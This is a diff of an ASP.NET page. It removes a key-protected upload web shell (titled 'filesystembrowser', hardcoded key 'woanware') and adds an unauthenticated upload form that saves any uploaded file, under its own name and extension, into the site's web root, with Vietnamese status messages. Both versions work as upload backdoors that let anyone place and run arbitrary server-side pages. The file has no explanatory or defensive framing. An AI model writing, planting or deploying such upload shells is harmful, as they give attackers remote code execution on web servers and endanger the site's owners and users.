@@ -1,118 +1,41 @@
 <%@ Page Language="C#" %>
-<%@ Import Namespace="System.IO" %>
+<!DOCTYPE html>
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+    <title>Upload File</title>
+</head>
+<body>
+    <form id="formUpload" runat="server" enctype="multipart/form-data">
+        <div>
+            <input type="file" id="fileUpload" runat="server" />
+            <br />
+            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
+        </div>
+    </form>
 
-<script runat="server">
-    private const string AUTHKEY = "woanware";
-    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
-    private const string FOOTER = "</body>\n</html>\n";
-    protected void Page_Load(object sender, EventArgs e)
-    {
-        try
+    <%
+        if (IsPostBack)
         {
-            if (Request.Params["authkey"] == null)
+            if (Request.Files.Count > 0)
             {
-                Response.Write(HEADER);
-                Response.Write(this.GetUploadControls());
-                Response.Write(FOOTER);
-                return;
-            }
-
-            if (Request.Params["authkey"] != AUTHKEY)
-            {
-                Response.Write(HEADER);
-                Response.Write(this.GetUploadControls());
-                Response.Write(FOOTER);
-                return;
-            }
-            
-            if (Request.Params["operation"] != null)
-            {
-                if (Request.Params["operation"] == "upload")
+                HttpPostedFile file = Request.Files[0];
+                if (file != null && file.ContentLength > 0)
                 {
-                    Response.Write(HEADER);
-                    Response.Write(this.UploadFile());
-                    Response.Write(FOOTER);
-                }
-                else
-                {
-                    Response.Write(HEADER);
-                    Response.Write("Unknown operation");
-                    Response.Write(FOOTER);
+                    try
+                    {
+                        string filename = Path.GetFileName(file.FileName);
+                        string path = Server.MapPath("~/" + filename);
+                        file.SaveAs(path);
+                        Response.Write("Upload thành công!");
+                    }
+                    catch (Exception ex)
+                    {
+                        Response.Write("Lỗi: " + ex.Message);
+                    }
                 }
             }
-            else
-            {
-                Response.Write(HEADER);
-                Response.Write(this.GetUploadControls());
-                Response.Write(FOOTER);
-            }
         }
-        catch (Exception ex)
-        {
-            Response.Write(HEADER);
-            Response.Write(ex.Message);
-            Response.Write(FOOTER);
-        }
-    }
-
-    /// <summary>
-    /// 
-    /// </summary>
-    private string UploadFile()
-    {
-        try
-        {
-            if (Request.Params["authkey"] == null)
-            {
-                return string.Empty;
-            }
-
-            if (Request.Params["authkey"] != AUTHKEY)
-            {
-                return string.Empty;
-            }
-            
-            if (Request.Files.Count != 1)
-            {
-                return "No file selected";
-            }
-
-            HttpPostedFile httpPostedFile = Request.Files[0];
-
-            int fileLength = httpPostedFile.ContentLength;
-            byte[] buffer = new byte[fileLength];
-            httpPostedFile.InputStream.Read(buffer, 0, fileLength);
-
-            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
-            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
-            {
-                fileStream.Write(buffer, 0, buffer.Length);
-            }
-
-            return "File uploaded";
-        }
-        catch (Exception ex)
-        {
-            return ex.ToString();
-        }
-    }
-
-    /// <summary>
-    /// 
-    /// </summary>
-    /// <returns></returns>
-    private string GetUploadControls()
-    {
-        string temp = string.Empty;
-
-        temp = "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">";
-        temp += "<br>Auth Key: <input type=\"text\" name=\"authKey\"><br>";
-        temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
-        temp += "<div><input type=\"submit\" value=\"Send\"></div>";
-        temp += "</form>";
-
-        return temp;
-    }
-</script>
+    %>
+</body>
+</html>
